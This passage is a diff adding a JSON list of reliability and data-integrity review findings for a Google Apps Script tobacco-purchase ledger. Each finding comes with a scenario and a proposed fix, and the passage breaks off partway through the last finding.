@@ -1,0 +1,1001 @@
+[
+ {
+  "title": "ITEM rows are committed before the NOTA row, with no rollback — a kill between them orphans the gulungan and exiles the file",
+  "where": "tulisNota_ lines 322-326 (ITEM setValues) vs 349-351 (NOTA setValues); cekInbox lines 473-475",
+  "scenario": "cekInbox is 5m40s into a burst of files. tulisNota_ writes 16 gulungan rows at ITEM line 325, then Apps Script kills the execution at the 6-minute limit (or Sheets throws a transient error) before line 351 writes the NOTA row. The 16 rows now exist with a NO NOTA that has no matching nota. The file was never moved (moveTo is at 473, after the write), so 5 minutes later the same file is retried: cariNota_ (line 441) only looks at the NOTA tab, finds nothing, and the fingerprint guard petaSidik_ (line 383) also only reads NOTA — so nothing stops a re-write. petaSeri_ does see the orphans and throws NOMOR SERI BENTROK, so the file goes to Lancelot-Gagal (line 475) and stays there. Net result: Aldi's nota is never in the ledger, 16 orphan rows sit in ITEM inflating nothing, and the only signal is a LOG row and a MASALAH line at 02:00 that nobody reads. If the nota had no seri/label (kunciSeri_ returns '' and is skipped, lines 311-312), the retry succeeds and writes all 16 gulungan a SECOND time instead — doubled bruto on a nota he pays against.",
+  "consequence": "LOST DATA",
+  "likelihood": "sedang",
+  "fix": "In tulisNota_, remember `awal` and the row count, wrap lines 328-351 in try/catch, and on any error `shI.deleteRows(awal, rows.length)` before rethrowing. Two lines, makes the nota all-or-nothing.",
+  "_lens": "v2:20f63548cc71e3ab3f38726a78db3a3a590d15b87df4b68fe4a31392198258ea"
+ },
+ {
+  "title": "Any transient Google error permanently exiles a good nota to Lancelot-Gagal, with no retry and nobody watching",
+  "where": "cekInbox lines 470-476, specifically the catch at 475",
+  "scenario": "The catch treats every exception identically: malformed JSON, a duplicate nota, and \"Service Spreadsheets timed out\" / \"We're sorry, a server error occurred\" all end in `f.moveTo(gagal)`. Google throws those transient errors routinely on a spreadsheet with 3000+ ITEM rows. Actor: the 5-minute trigger hits one such hiccup on a Tuesday. The perfectly valid nota for Mita's 23 gulungan is moved to Lancelot-Gagal and is never retried by anything, ever. Nothing in the script reads Lancelot-Gagal, nothing counts it, and cekInbox still returns and logs normally — so no trigger-failure email is generated either. Aldi settles with Mita from a ledger that is missing that nota.",
+  "consequence": "LOST DATA",
+  "likelihood": "tinggi",
+  "fix": "Only exile on errors that are permanent by construction: `if (/sudah ada|KEMBAR|BENTROK|JSON|wajib/i.test(String(e.message))) f.moveTo(gagal); else catat_('cekInbox','ULANG',...)` and leave the file in the Inbox — the next 5-minute run retries it.",
+  "_lens": "v2:20f63548cc71e3ab3f38726a78db3a3a590d15b87df4b68fe4a31392198258ea"
+ },
+ {
+  "title": "Nothing anywhere detects that the automation has stopped — a dead trigger is indistinguishable from a quiet week",
+  "where": "nyalakanOtomatis lines 508-521; cekInbox line 477 returns a count nobody stores; catat_ lines 70-73 only writes when something runs",
+  "scenario": "Any of these stops cekInbox with zero visible change in the spreadsheet: (a) the script is edited to use a new service, so every trigger fails with \"Authorization is required\" until a function is run manually and re-consented; (b) a heavy harvest day exhausts the consumer 90-minute/day total trigger runtime, and every trigger stops for the rest of that day; (c) Google disables a repeatedly-failing trigger; (d) matikanOtomatis was run. In all four cases the LOG simply stops growing, which looks exactly like \"no notas arrived this week\". Claude keeps dropping JSON into Lancelot-Inbox, the files pile up, and the ledger keeps showing complete, consistent, current-looking data — just missing three weeks of purchases. Aldi pays agen off it.",
+  "consequence": "LOST DATA",
+  "likelihood": "tinggi",
+  "fix": "One cell as a heartbeat: at the end of cekInbox, `ss_().getSheetByName('DASHBOARD').getRange('M1').setValue(new Date())`, and put a formula next to the KPI cards that turns red when `NOW()-M1 > 30 minutes`. He looks at DASHBOARD; he never looks at LOG.",
+  "_lens": "v2:20f63548cc71e3ab3f38726a78db3a3a590d15b87df4b68fe4a31392198258ea"
+ },
+ {
+  "title": "cekKualitas runs at 02:00 and reports to a UI alert that cannot exist, then wipes yesterday's findings",
+  "where": "lapor_ line 67 (getUi inside a swallowed try/catch); cekKualitas lines 999-1000 (sh.clear()) and 1020-1022; catat_ line 71-72",
+  "scenario": "Under a time-driven trigger there is no UI, so `SpreadsheetApp.getUi()` throws and the empty catch at line 67 swallows it. So the nightly run that finds 40 BERAT problems produces exactly one visible artifact: the MASALAH tab. Line 1000 then does `sh.clear()` on MASALAH every night, so a problem that appeared on 3 July and was fixed by an unrelated edit on 5 July leaves no trace it ever existed, and a problem found tonight silently replaces last night's list. Separately, catat_ line 71 is `if (sh) sh.appendRow(...)` — if the LOG tab is ever renamed or deleted, every log write in the entire script becomes a no-op with no error. Both reporting channels fail closed to silence.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "tinggi",
+  "fix": "In cekKualitas, after computing `berat`, write the count to a fixed DASHBOARD cell (e.g. `A2` = '⚠️ 12 masalah — cek tab MASALAH' or blank) so the number lands on the screen he actually opens. And drop the `if (sh)` in catat_ — let a missing LOG throw.",
+  "_lens": "v2:20f63548cc71e3ab3f38726a78db3a3a590d15b87df4b68fe4a31392198258ea"
+ },
+ {
+  "title": "No LockService anywhere: two overlapping runs both read the same getLastRow() and overwrite each other's rows",
+  "where": "tulisNota_ line 323 (`shI.getLastRow()+1`) and line 349 (`shN.getLastRow()+1`); cekInbox 467-478; no LockService call exists in the file",
+  "scenario": "Aldi gets impatient, opens the editor and clicks Run on cekInbox while the 5-minute trigger's run is already in flight (or a burst of files makes one run overlap the next). Run A computes `awal = 501` and is between line 323 and line 325. Run B computes `awal = 501` too, because A hasn't written yet. Both `setValues` — which overwrites, it does not append — at row 501. A's gulungan are silently replaced by B's. Both files move to Lancelot-Selesai, both log OK, both return success. The NOTA tab now has two nota rows whose TOTAL BRUTO matches nothing in ITEM. The only detection is the 02:00 cekKualitas writing 'TOTAL BRUTO tidak sama dengan jumlah gulungan' into a tab with no notification (see the finding above).",
+  "consequence": "LOST DATA",
+  "likelihood": "sedang",
+  "fix": "First line of cekInbox: `var l = LockService.getScriptLock(); if (!l.tryLock(0)) return {masuk:0, gagal:0};` and `l.releaseLock()` at the end. Same lock in hapusMigrasi and migrasiDataLama.",
+  "_lens": "v2:20f63548cc71e3ab3f38726a78db3a3a590d15b87df4b68fe4a31392198258ea"
+ },
+ {
+  "title": "catatEdit is blind to the most destructive manual change: deleting a row fires no onEdit at all",
+  "where": "catatEdit lines 495-506, especially the comment at 495 and `e.oldValue` at 501",
+  "scenario": "Aldi right-clicks a row in NOTA and picks Delete row. onEdit does not fire for structural changes (that is onChange, changeType REMOVE_ROW), so LOG records nothing whatsoever. The nota is gone; its 16 gulungan stay in ITEM as orphans. Second case, same function: on a multi-cell paste or a drag-fill, `e.oldValue` is undefined (it is only populated for single-cell edits) so it logs '(kosong)', and `e.range.getDisplayValue()` returns only the TOP-LEFT cell of the range. So pasting over 50 rows of NOTA produces one line — `NOTA!A5 : \"(kosong)\" -> \"MITA\"` — which claims one cell changed when 50 notas were overwritten. The comment at line 495 says this records what a person changed by hand; for the two ways a person actually destroys data, it does not.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "tinggi",
+  "fix": "Add an installable onChange trigger in nyalakanOtomatis logging `e.changeType` (`ScriptApp.newTrigger('catatUbah').forSpreadsheet(SPREADSHEET_ID).onChange().create()`), and in catatEdit log `e.range.getNumRows()+'x'+e.range.getNumColumns()` so the blast radius is honest.",
+  "_lens": "v2:20f63548cc71e3ab3f38726a78db3a3a590d15b87df4b68fe4a31392198258ea"
+ },
+ {
+  "title": "matikanOtomatis deletes every trigger, is exposed in the Run dropdown, and reports nothing",
+  "where": "matikanOtomatis lines 523-525; called by nyalakanOtomatis line 509",
+  "scenario": "The function has no trailing underscore, so it appears in the Apps Script Run dropdown directly under nyalakanOtomatis. Aldi picks it to pause the inbox while he tidies a nota by hand. `ScriptApp.getProjectTriggers().forEach(deleteTrigger)` removes ALL FOUR triggers — the 5-minute inbox watcher, the nightly quality check, the Sunday backup, and the edit audit log — not just the inbox one. The function calls neither catat_ nor lapor_, so there is no LOG row, no alert, and nothing changes in the spreadsheet. He tidies his nota and forgets. From that moment: nothing is imported, nothing is checked, nothing is backed up, and no manual edit is recorded, for as long as he doesn't notice.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "sedang",
+  "fix": "Add `catat_('matikanOtomatis','OK', n + ' trigger dihapus')` (count them first) and a `lapor_` so a manual run says out loud that the backup and the audit log are off too.",
+  "_lens": "v2:20f63548cc71e3ab3f38726a78db3a3a590d15b87df4b68fe4a31392198258ea"
+ },
+ {
+  "title": "folder_() resolves folders by name and returns trashed ones — processed notas get moved into the trash and auto-purged",
+  "where": "folder_ lines 480-483; used by cekInbox line 468 and backupMingguan line 487",
+  "scenario": "`DriveApp.getFoldersByName` returns folders that are in the trash — this is a documented Drive gotcha and there is no `isTrashed()` check here. Actor: Aldi sees Lancelot-Selesai has grown to 400 processed JSON files, decides it is clutter, and deletes it. Drive puts it in the trash, not gone. On the next run, `folder_(FOLDER_SELESAI)` finds it, `it.hasNext()` is true, and it is returned. Every subsequently processed file is `moveTo`'d into a trashed folder — so every source JSON, the only machine-readable record of what the handwritten nota actually said, is queued for permanent deletion in 30 days. cekInbox logs OK for all of them. Same mechanism on Lancelot-Inbox: trash it and the watcher silently reads a trashed folder, or `createFolder` makes a second empty one at the root of My Drive while Claude keeps dropping into the original.",
+  "consequence": "LOST DATA",
+  "likelihood": "sedang",
+  "fix": "In folder_, skip trashed and take the first live match: `while (it.hasNext()) { var f = it.next(); if (!f.isTrashed()) return f; }` before falling through to createFolder. Better still, replace the four name constants with folder IDs.",
+  "_lens": "v2:20f63548cc71e3ab3f38726a78db3a3a590d15b87df4b68fe4a31392198258ea"
+ },
+ {
+  "title": "backupMingguan is unbounded, and when Drive fills it fails before the line that records the failure",
+  "where": "backupMingguan lines 486-493 — makeCopy at 490 precedes catat_ at 491; no pruning anywhere",
+  "scenario": "52 full copies of a growing spreadsheet per year, forever, into a 15 GB consumer quota shared with Gmail and Photos (Google-format files have counted against quota since 2021). When the quota is exceeded, `makeCopy` at line 490 throws — and because catat_ is on line 491, the failure is never logged; the LOG shows the last successful backup and then nothing, which looks identical to 'the trigger ran fine, nothing to say'. Worse, a Drive over quota makes existing files read-only, so cekInbox's setValues starts throwing, and by the exile rule above every incoming nota is dumped into Lancelot-Gagal. The one mechanism that protects him from a bad delete dies silently, and it takes the import pipeline with it.",
+  "consequence": "LOST DATA",
+  "likelihood": "sedang",
+  "fix": "Prune inside backupMingguan after the copy: iterate `f.getFiles()` and `setTrashed(true)` anything with `getDateCreated()` older than ~8 weeks. And move catat_ so a throw is still recorded — wrap makeCopy in try/catch, log GAGAL, rethrow.",
+  "_lens": "v2:20f63548cc71e3ab3f38726a78db3a3a590d15b87df4b68fe4a31392198258ea"
+ },
+ {
+  "title": "tulisNota_ rescans both whole sheets for every nota, so a harvest-day backlog hits the 6-minute limit every 5 minutes forever",
+  "where": "tulisNota_ line 263 (cariNota_), 304 (petaSidik_), 309 (petaSeri_); petaSeri_ lines 396-414 reads all of NOTA and all of ITEM; sidikNota_ line 376 calls ss_() per row",
+  "scenario": "Per nota, the script does: a full NO NOTA column read, a full NOTA read to build the fingerprint map, and a full NOTA + full ITEM read to build the seri map — three full-sheet scans, rebuilt from scratch for every nota, inside the per-nota loop (tulisDariJson_ line 453) inside the per-file loop (cekInbox line 470). Nothing is cached between notas. On top of that, `sidikNota_` calls `ss_()` (SpreadsheetApp.openById) just to fetch the timezone, and petaSidik_ calls it once per existing nota row. Actor: Aldi photographs a whole harvest day, Claude drops 25 JSON files at once, ITEM already holds 3000 rows. The run is killed at 6 minutes — mid-write, triggering the orphan finding above. The remaining files sit in the Inbox and are retried 5 minutes later, killed again, forever, burning the daily trigger-runtime quota until every trigger stops.",
+  "consequence": "BLOCKED WORK",
+  "likelihood": "sedang",
+  "fix": "Two changes: build petaSidik_/petaSeri_ once at the top of cekInbox and pass them into tulisNota_; and add a clock guard so it stops cleanly between files instead of mid-write — `var t0 = Date.now();` and `if (Date.now() - t0 > 240000) break;` at the top of the while loop. Also hoist the timezone out of sidikNota_.",
+  "_lens": "v2:20f63548cc71e3ab3f38726a78db3a3a590d15b87df4b68fe4a31392198258ea"
+ },
+ {
+  "title": "backupMingguan copies the confidential pabrik prices into whatever folder happens to be named Lancelot-Backup, including a shared one",
+  "where": "backupMingguan lines 487-490 via folder_ lines 480-483",
+  "scenario": "`getFoldersByName` searches everything the account can access, including folders under 'Shared with me', and returns the FIRST match in unspecified order. If any folder named Lancelot-Backup is shared with Aldi — or if he ever shares one of his own so someone can drop photos, or an agen creates one and shares it — Sunday at 01:00 the script silently `makeCopy`s the ENTIRE spreadsheet into it. The copy inherits that folder's sharing. That copy contains the NOTA CETAK 'RAHASIA' pabrik block, every harga pabrik in ITEM, TOTAL JUMLAH vs DIBAYAR per nota, and the CUAN figure — the exact material the confidentiality rule exists to keep from agen. No human is in the loop and nothing is logged that would distinguish it from a normal backup.",
+  "consequence": "LEAKED DATA",
+  "likelihood": "rendah",
+  "fix": "Resolve the backup folder by hardcoded ID, not name, and assert ownership before copying: `var f = DriveApp.getFolderById(BACKUP_ID); if (f.getOwner().getEmail() !== Session.getEffectiveUser().getEmail()) throw new Error('folder backup bukan milik sendiri');`",
+  "_lens": "v2:20f63548cc71e3ab3f38726a78db3a3a590d15b87df4b68fe4a31392198258ea"
+ },
+ {
+  "title": "getProjectTriggers is per-user, so a second Google account silently doubles every trigger and matikanOtomatis cannot remove them",
+  "where": "nyalakanOtomatis lines 508-514; matikanOtomatis lines 523-525",
+  "scenario": "`ScriptApp.getProjectTriggers()` only returns triggers owned by the account currently running. Aldi runs the setup once from his phone account and once from his laptop account (or a helper with edit access runs step 7 from the README). matikanOtomatis at line 509 sees only its own account's triggers, so it deletes nothing belonging to the other account. Result: two cekInbox watchers running on the same Inbox and the same rows every 5 minutes — the concurrent-clobber failure above stops being a race and becomes routine, because both watchers reach for the same `getLastRow()+1` constantly. Also two full-spreadsheet backups every Sunday, filling Drive twice as fast. And from either account, matikanOtomatis can never turn the other one off.",
+  "consequence": "WRONG DATA",
+  "likelihood": "rendah",
+  "fix": "In nyalakanOtomatis, claim ownership once: read `PropertiesService.getScriptProperties().getProperty('PEMILIK')`; if it is set and is not `Session.getEffectiveUser().getEmail()`, throw with the owning address instead of creating triggers.",
+  "_lens": "v2:20f63548cc71e3ab3f38726a78db3a3a590d15b87df4b68fe4a31392198258ea"
+ },
+ {
+  "title": "pasangSheet issues ~1,700 individual formatting calls and can time out mid-setup with no record of what got built",
+  "where": "rapi_ lines 186-193 — the banding loop `for (var b = 3; b <= n + 1; b += 2)` is 1,500 setBackground calls for ITEM's 3,000 rows plus 200 for NOTA; called at lines 140 and 156",
+  "scenario": "Each loop iteration is a separate range operation, plus the per-column setColumnWidth loops at line 191 and 170, plus setRowHeights over 3,000 rows. On step 2 of the setup this can exceed the 6-minute limit inside `rapi_(it, ...)` at line 156. Everything after it never runs: the ITEM number formats (157-158), the IN/OUT dropdown (159), the conditional colours (162), the four master tabs and their seeds (164-176), and pasangValidasiMaster_ (178). catat_ at line 179 never runs either, so LOG has no entry — the only evidence is a red timeout in the editor that Aldi may read as 'it finished'. He then runs steps 3-5 against a half-built spreadsheet with no agen/petani validation, which is precisely the MITA-vs-MITHA split the comment at line 223 says must never happen.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "sedang",
+  "fix": "Replace the banding loop in rapi_ with the native one call: `sh.getRange(2, 1, n, lebar).applyRowBanding(SpreadsheetApp.BandingTheme.LIGHT_GREY)` — deletes 1,700 API calls.",
+  "_lens": "v2:20f63548cc71e3ab3f38726a78db3a3a590d15b87df4b68fe4a31392198258ea"
+ },
+ {
+  "title": "A file whose name does not end in .json is silently skipped forever — not processed, not moved, not logged",
+  "where": "cekInbox line 472: `if (f.getName().slice(-5).toLowerCase() !== '.json') continue;`",
+  "scenario": "`continue` skips the file without moving it and without any catat_ call. Actor: Aldi drops a photo of a nota straight into Lancelot-Inbox thinking that is how it works, or Claude writes `nota-mita.json.txt`, or the filename carries a trailing space so `slice(-5)` is 'json ' instead of '.json'. The file stays in the Inbox permanently and is re-skipped every 5 minutes, 288 times a day, forever. There is no LOG line, no MASALAH entry, and no visible difference from an empty Inbox — and because the folder is not empty, Aldi glancing at Drive sees 'something is in there, it must be working'.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "sedang",
+  "fix": "Turn the skip into a reported exile: `if (...) { f.moveTo(gagal); catat_('cekInbox','GAGAL', f.getName() + ' — bukan .json'); continue; }`",
+  "_lens": "v2:20f63548cc71e3ab3f38726a78db3a3a590d15b87df4b68fe4a31392198258ea"
+ },
+ {
+  "title": "A nota's gulungan are written before its NOTA row; a retry duplicates them, then the seri guard blocks the nota forever",
+  "where": "tulisNota_ lines 322-326 (ITEM write) vs 347-351 (NOTA write); cekInbox line 473 (moveTo only after tulisDariJson_ returns); petaSeri_ lines 396-414",
+  "scenario": "The 5-minute cekInbox trigger picks up nota-012.json (40 gulungan). tulisNota_ writes the 40 ITEM rows at line 325, then the 6-minute Apps Script limit fires (or Sheets throws) before line 351 writes the NOTA row. The file was never moved, so it is still in Lancelot-Inbox. Five minutes later the trigger reads it again: cariNota_ returns 0 because there is no NOTA row, so the guard at line 263 passes — but petaSeri_ now sees the 40 orphan ITEM rows, and because jenis['012'] is undefined they are not skipped as JUAL PABRIK, so every incoming seri matches and line 317 throws NOMOR SERI BENTROK. The file goes to Lancelot-Gagal. Nota 012 is never recorded, 40 phantom gulungan sit in ITEM forever, and the error message blames the agen for reusing seri numbers. At 40 agen the timeout is routine, not exotic: each tulisNota_ does three full scans (cariNota_ 445, petaSidik_ 386, petaSeri_ 400+405), so one 8-file batch over 80,000 ITEM rows is dozens of full-table reads.",
+  "consequence": "LOST DATA",
+  "likelihood": "tinggi",
+  "fix": "Swap the write order in tulisNota_: write the single NOTA row (lines 347-351) before the ITEM block (lines 322-326). A retry then stops at cariNota_ with 'sudah ada' instead of duplicating gulungan, and the half-written state becomes a nota with zero items, which cekKualitas already reports loudly at line 983.",
+  "_lens": "v2:4db2548cb228d214e9cb745d74454530bbfb97df6cee591f49e7fdd80e7decaa"
+ },
+ {
+  "title": "cekInbox takes no lock; two overlapping runs compute the same ITEM start row and one nota's gulungan get overwritten",
+  "where": "cekInbox lines 467-478 (no LockService anywhere in the file); tulisNota_ line 323 (awal = shI.getLastRow() + 1) and line 349 (br = shN.getLastRow() + 1)",
+  "scenario": "Aldi opens the Apps Script editor and clicks Run on cekInbox while the 5-minute trigger is already mid-batch (guaranteed overlap; nothing in the file serializes runs). Run A reads shI.getLastRow() = 5000 and starts writing nota 012's 40 rows at 5001. Run B, holding a different file, reads getLastRow() = 5000 too and writes nota 013's 30 rows at 5001, on top of A's. Nota 012 now has 10 gulungan in ITEM instead of 40, but its NOTA row still says JUMLAH GULUNG 40, TOTAL BRUTO 1600. Aldi pays MITA the DIBAYAR figure from the NOTA row, while IN-OUT and the agen printout show 10 rolls. cekKualitas only notices at 02:00 the next night, and reports it as 'TOTAL BRUTO tidak sama' with no hint that rows were clobbered. Both runs can also duplicate the same file entirely, since neither has moved it yet when the other lists the folder.",
+  "consequence": "LOST DATA",
+  "likelihood": "tinggi",
+  "fix": "First line of cekInbox: var l = LockService.getScriptLock(); if (!l.tryLock(0)) return {masuk:0, gagal:0}; and release in a finally. Three lines, and it also protects the manual-run case.",
+  "_lens": "v2:4db2548cb228d214e9cb745d74454530bbfb97df6cee591f49e7fdd80e7decaa"
+ },
+ {
+  "title": "tanggal_ silently stamps today's date on any date it cannot parse, which also defeats the duplicate-nota fingerprint",
+  "where": "tanggal_ lines 87-102 (return isNaN(d.getTime()) ? new Date() : d); used at tulisNota_ lines 329 and 341; sidikNota_ lines 374-381",
+  "scenario": "Claude reads a handwritten nota dated '25-07-2026'. Neither regex matches (line 90 requires slashes, line 92 requires a month name), new Date('25-07-2026') is Invalid Date in V8, so line 101 returns today. The nota is filed under the trigger's run date. Two consequences compound: (a) DASHBOARD's perBulan bucket (line 794) and the period filter at N3 put July's purchase in whatever month the script ran; (b) sidikNota_ hashes that same wrong date, so when the same photo is dropped in again next week it produces a different fingerprint, petaSidik_ finds no match, and the identical nota is written a second time with a different NO NOTA — the exact double-submit the fingerprint exists to stop. Nothing in cekKualitas checks dates at all.",
+  "consequence": "WRONG DATA",
+  "likelihood": "tinggi",
+  "fix": "In tanggal_, change line 90's separator class to [\\/\\-.] and replace the line 101 fallback with throw new Error('tanggal tidak terbaca: ' + s). A nota that lands in Lancelot-Gagal with a readable reason is recoverable; one silently dated today is not.",
+  "_lens": "v2:4db2548cb228d214e9cb745d74454530bbfb97df6cee591f49e7fdd80e7decaa"
+ },
+ {
+  "title": "A swapped caraTara/nilaiTara unit produces a wrong netto that every quality check passes",
+  "where": "hitungTara_ lines 117-120; tulisNota_ lines 266 (nilai defaults to 0.1) and 275-276; cekKualitas lines 964-973 (no netto<=0 and no tara sanity test)",
+  "scenario": "Claude reads a nota where tara is 2 kg per gulungan but writes caraTara:'persen', nilaiTara:2 (or omits caraTara, which defaults to 'persen' at line 265). hitungTara_ returns bruto*2, netto goes negative, jumlah = netto*harga goes negative, and DIBAYAR at line 337 is negative. cekKualitas checks bruto<=0 (line 968) and netto>bruto (line 969) but never netto<=0 or netto<0, and the JUMLAH cross-check at line 972 passes because jumlah was computed from the same wrong netto — so the nota is reported clean, and RINGKASAN's sum(DIBAYAR) is silently reduced by that agen's whole nota. The mirror case is the expensive one: caraTara:'kg' with nilaiTara:0.1 (a percentage written into a kg field) gives a flat 0.1 kg tara instead of 10%. On a 40 kg roll at Rp 55.000, netto reads 39.9 instead of 36 — Rp 214.500 overpaid per gulungan, Rp 8,5 juta on a 40-roll nota, and MASALAH stays empty because netto (39.9) is still less than bruto (40).",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Two lines in cekKualitas next to line 969: if (netto <= 0) lapor('BERAT', ...) and if (bruto - netto > bruto * 0.5) lapor('BERAT', 'tara lebih dari separuh bruto'). Optionally make caraTara required in tulisNota_ instead of defaulting at line 265.",
+  "_lens": "v2:4db2548cb228d214e9cb745d74454530bbfb97df6cee591f49e7fdd80e7decaa"
+ },
+ {
+  "title": "tulisDariJson_ is not atomic across a JSON array, and re-dropping the fixed file makes the untouched notas permanently unwritable",
+  "where": "tulisDariJson_ lines 450-455 (data.forEach with no per-nota catch); tulisNota_ line 263; cekInbox lines 473-475",
+  "scenario": "Aldi's Claude session drops one file holding five notas from a day's collection. Nota 3 has a seri that collides (line 317) or a missing noNota (line 262). The forEach throws on nota 3, so notas 1 and 2 are already fully written to NOTA and ITEM, notas 3-5 are not, and cekInbox moves the whole file to Lancelot-Gagal with one LOG line naming only nota 3's error. Aldi fixes nota 3 and drops the file back into the Inbox. Now cariNota_ finds nota 1 at line 263 and throws 'Nota 1 sudah ada' on the very first iteration — the file goes to Gagal again and notas 3, 4 and 5 are never written no matter how many times he retries. Two of five days' purchases are missing from the ledger and nothing on any screen says so.",
+  "consequence": "LOST DATA",
+  "likelihood": "tinggi",
+  "fix": "In tulisDariJson_, wrap the per-nota call: try { tulisNota_(d) } catch (e) { if (/sudah ada/.test(e.message)) { catat_('lewat', 'INFO', d.noNota); return; } gagal.push(d.noNota + ': ' + e.message); }, then throw the collected list once at the end. Already-present notas become skips, so a retry finishes the job.",
+  "_lens": "v2:4db2548cb228d214e9cb745d74454530bbfb97df6cee591f49e7fdd80e7decaa"
+ },
+ {
+  "title": "petaSeri_ keys on seri+label alone, with no agen and no musim, so legitimate reuse blocks real notas",
+  "where": "petaSeri_ lines 396-414; kunciSeri_ lines 368-372; the guard at tulisNota_ lines 309-319",
+  "scenario": "Seri codes are short petani markings ('KS 5', 'RA 7', 'MT 1'). With 40 agen, MITA's 'KS 5' and YOHAN's 'KS 5' are different tobacco from different farmers, but kunciSeri_ produces the identical key for both and petaSeri_ scans the entire ITEM history with no agen or date scope. YOHAN's nota throws NOMOR SERI BENTROK at line 317 and lands in Lancelot-Gagal. The same happens wholesale next musim, when every agen restarts their seri numbering against a table still holding this year's rows. The documented escape is 'abaikanDuplikat': true — but line 302 gates BOTH checks behind that one flag, so switching it on to get past a false seri clash also turns off the fingerprint check at line 303, and the next genuinely double-photographed nota is written twice without a word.",
+  "consequence": "BLOCKED WORK",
+  "likelihood": "tinggi",
+  "fix": "Build the seri key with its owner and year: kunciSeri_(agen + '|' + tahun, seri, label) — petaSeri_ already reads the NOTA row (line 400) so agen and tanggal are in hand. And split the flag at line 302 into abaikanKembar and abaikanSeri so disabling one does not disable the other.",
+  "_lens": "v2:4db2548cb228d214e9cb745d74454530bbfb97df6cee591f49e7fdd80e7decaa"
+ },
+ {
+  "title": "NO NOTA is globally unique with no musim in the key, so next season's nota 001 is rejected as already existing",
+  "where": "tulisNota_ line 263; cariNota_ lines 441-448; cekInbox line 475",
+  "scenario": "MITA numbers her notas 001, 002, 003 each season. In musim 2027 she issues nota 001 again. cariNota_ scans the full NO NOTA column, finds the 2026 row, and tulisNota_ throws 'Nota 001 sudah ada. Tidak ditimpa.' The file goes to Lancelot-Gagal. This is not an edge case that fires once — it fires on the first nota of the new season and on most notas after it, and the same collision arrives immediately once several of 40 agen use small sequential numbers. The only visible trace is a LOG row; the inbox looks empty and processed.",
+  "consequence": "BLOCKED WORK",
+  "likelihood": "tinggi",
+  "fix": "Store the nota key namespaced: noNota = (d.agen || '?') + '/' + tahun + '/' + rawNo at the top of tulisNota_ (line 261), keeping the agen's own number in CATATAN. NOTA CETAK's VLOOKUP and the ITEM join both follow the stored value automatically.",
+  "_lens": "v2:4db2548cb228d214e9cb745d74454530bbfb97df6cee591f49e7fdd80e7decaa"
+ },
+ {
+  "title": "The agen printout lists rejected gulungan with full bruto and netto and no IN/OUT column",
+  "where": "buatNotaCetak lines 911-918 (header ['NO','SERI','LABEL','PETANI','BRUTO','NETTO'] and the FILTER at A12); tulisNota_ lines 288-292 (OUT rows keep bruto, tara and netto)",
+  "scenario": "A 40-gulungan nota comes back from Om CK with 6 rolls marked OUT. tulisNota_ correctly zeroes JUMLAH and ONGKOS for those rows but still writes their BRUTO and NETTO (line 288). The FILTER at A12 pulls NO, SERI, LABEL, PETANI, BRUTO, NETTO for every row of the nota — a rejected roll is indistinguishable from an accepted one on the sheet Aldi hands to MITA. There is no total row either, so MITA adds the NETTO column herself, gets 1.480 kg, and invoices for all of it while DIBAYAR was computed on 1.260 kg. The OUT count sits alone in cell E7 with no indication of which rolls it refers to. At 3 notas he can explain it verbally; at 40 agen it is a standing dispute.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Add i('IN/OUT') to the FILTER array at line 917 and 'IN/OUT' to the header at line 914, and put =SUM of the netto column under the block so the agen's total matches Aldi's.",
+  "_lens": "v2:4db2548cb228d214e9cb745d74454530bbfb97df6cee591f49e7fdd80e7decaa"
+ },
+ {
+  "title": "RINGKASAN and the DASHBOARD per-agen block sum buy and sell notas together, doubling every agen's kilos and money",
+  "where": "buatTampilan lines 680-688 (RINGKASAN QUERY: 'where AGEN is not null group by AGEN', no JENIS NOTA filter); buatDashboard lines 792-804 (perAgen accumulates on every nota row)",
+  "scenario": "Goods ship straight from the agen to the pabrik, so a JUAL PABRIK nota naturally carries the originating AGEN — tulisNota_ writes d.agen for every jenis (line 332), and H_NOTA has AGEN and PABRIK on the same row. The moment one JUAL PABRIK nota carries an agen name, RINGKASAN's sum(JUMLAH GULUNG), sum(TOTAL BRUTO) and sum(TOTAL NETTO) count that tobacco twice for MITA, and sum(DIBAYAR) adds what the pabrik paid Aldi to what Aldi paid MITA — a single column that is now neither. The DASHBOARD 'Gulungan per agen' chart (line 848) draws the same doubled figure. Today, with three BELI-only notas, both are correct; the error appears silently on the first sell nota and grows with every one after.",
+  "consequence": "WRONG DATA",
+  "likelihood": "sedang",
+  "fix": "Add \" where \" + n('JENIS NOTA') + \" = 'BELI PETANI' and \" ... to the RINGKASAN query at line 684, and one early return in the buatDashboard loop: if (jual) return; before the perAgen accumulation at line 799.",
+  "_lens": "v2:4db2548cb228d214e9cb745d74454530bbfb97df6cee591f49e7fdd80e7decaa"
+ },
+ {
+  "title": "cekKualitas clears MASALAH, then throws when there are more than 998 findings, leaving a blank sheet that reads as clean",
+  "where": "cekKualitas lines 999-1019: sh.clear() at 1000, then sh.getRange(3, 1, masalah.length, 3).setValues(masalah) at 1006, then catat_ at 1019",
+  "scenario": "MASALAH is created by insertSheet, which gives 1000 rows, and nothing ever resizes it. One systematic problem generates one finding per row — e.g. a batch where Claude omitted HARGA produces a RINGAN per gulungan (line 971), and reused seri produce a BERAT per key (line 435). At a few thousand gulungan, masalah.length passes 998, getRange at line 1006 throws 'dimensions of the range are invalid', and the throw happens after sh.clear() has already wiped the sheet and after the header rows were written. Aldi opens MASALAH the next morning and sees a title, a header row and nothing else — indistinguishable from clean. catat_ at line 1019 never runs, so LOG has no cekKualitas entry either, and the nightly trigger fails with no alert. The same function also getValues() the whole of NOTA and ITEM in one shot (lines 947-948), which at 80.000 gulungan is 1,3 juta cells in one call.",
+  "consequence": "SILENT FAILURE",
+  "likelihood": "sedang",
+  "fix": "Before line 1006: if (masalah.length + 3 > sh.getMaxRows()) sh.insertRowsAfter(sh.getMaxRows(), masalah.length + 10); and move catat_ into a finally so a crash still leaves a LOG line.",
+  "_lens": "v2:4db2548cb228d214e9cb745d74454530bbfb97df6cee591f49e7fdd80e7decaa"
+ },
+ {
+  "title": "catatEdit captures nothing useful for a multi-cell paste, so the manual-edit trail is empty exactly when a bulk correction is made",
+  "where": "catatEdit lines 496-506 (e.oldValue at 501, e.range.getDisplayValue() at 502)",
